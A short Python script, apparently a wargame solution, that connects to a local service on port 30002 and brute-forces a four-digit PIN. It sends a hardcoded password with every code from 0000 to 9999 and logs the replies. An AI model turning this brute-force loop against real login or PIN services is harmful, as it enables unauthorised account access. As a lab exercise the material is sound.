import socket

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("localhost", 30002))
f = open("./output","w")
password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ "

for i in range(10000):
    code = str(format(i, '04d')) 
    f.write(client.recv(4096))
    client.send(password + code)
    f.write(client.recv(4096))
